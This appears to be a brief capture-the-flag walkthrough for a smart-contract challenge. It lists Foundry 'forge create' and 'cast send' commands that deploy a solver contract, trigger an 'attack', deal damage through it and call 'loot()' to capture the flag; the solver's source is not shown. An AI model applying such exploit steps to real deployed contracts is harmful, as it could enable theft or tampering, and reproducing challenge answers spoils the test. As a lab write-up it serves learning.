# Just run:

- This is to create the thingy:
```bash 
forge create src/Solve.sol:Solve --rpc-url <URL>/rpc
--private-key <PRIV_KEY> --broadcast --constructor-args <TARGET_ADRESS>

# Note the output:
# "Deployed to: {hash}" <-- The hash will be needed
```

- This is to aggro the thingy:
```bash
cast send <TARGET_ADDRESS> "attack(uint256)" 100 --rpc-url <URL>/rpc --private-key <PRIV_KEY>

# The code will aggro the monster into msg.sender
```

- This is to attack the thingy:
```bash
cast send <DEPLOYED_HASH> "f(uint256)" 1000 --rpc-url <URL>/rpc --private-key <PRIV_KEY>

# The code (above) will call the f() function from Solve.sol and attack the monster with 1000 damage, killing it.
```

- This is to loot the thingy:
```bash
cast send 0xd95488583eCDc70eA1E6FC9af72C59A31F058381 "loot()" --rpc-url <URL>/rpc --private-key <PRIV_KEY>

# This code will loot the deadbody of a monster, capturing the flag
```

After all of that, to actually get the flag, just go to:
<URL>/flag.